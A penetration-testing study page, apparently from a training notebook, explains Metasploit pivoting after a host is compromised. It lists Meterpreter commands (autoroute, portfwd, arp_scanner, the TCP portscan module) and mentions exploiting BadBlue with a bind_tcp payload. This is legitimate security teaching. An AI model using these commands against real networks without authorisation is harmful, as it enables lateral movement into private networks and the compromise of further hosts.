# 12 - Pivoting

## Pivoting

* Pivoting is a post exploitation technique that involves utilizing a compromised host that is connected to multiple networks to gain access to systems within other networks.
* After gaining access to one host, we can use the compromised host to exploit other hosts on a private internal network to which we could not access previously.
* Meterpreter provides us with the ability to add a network route to the internal network's subnet, perform port forwarding and consequently scan and exploit other systems on the network.

## **Port Forwarding**

* Port forwarding is the process of redirecting traffic from a specific port on a target system to a specific port on our system.
* In the context of pivoting, we can forward a remote port on a previously inaccessible host to a local port on our Kali Linux system so that we can remotely interact/exploit the service running on the port.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
meterpreter > run autoroute -s <subnet> #Add a route to a subnet
meterpreter > run autoroute -p #Display the active routing table.

msf6 > use auxiliary/scanner/portscan/tcp #When targeting a system part of a subnet that we route with meterpreter, we need to use an MSF module to scan it. set PHOSTS $ip_victim2IP, set RPORTS 1-100 to scan 100 ports.

meterpreter > portfwd add -l <localPort> -p <remotePort> -r <targetIP> #Port forward a remote port on the target system to a local port on our local system.
# We can then scan/exploit the remote port through the local specified port without using MSF.

# With MSF --> Use target IP.
# we use the BadBlue vuln, set payload windows/meterpreter/bind_tcp, run, we get a meterpreter session.

# Withtout MSF --> Use forwarded port on localhost.
```
{% endcode %}

## Scanning for Other Hosts after adding the subnet

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Now we have added a subnet, for example 192.168.0.1/24
# From the meterpreter sessiokn, we can scan for all hosts up in this subnet, using the  "Arp_scanner"
meterpreter > run arp_scanner -r 192.168.0.1/24 # scans entire subnet for up hosts.
background # background the session.
msf> route print # to view all added routes.
```
{% endcode %}

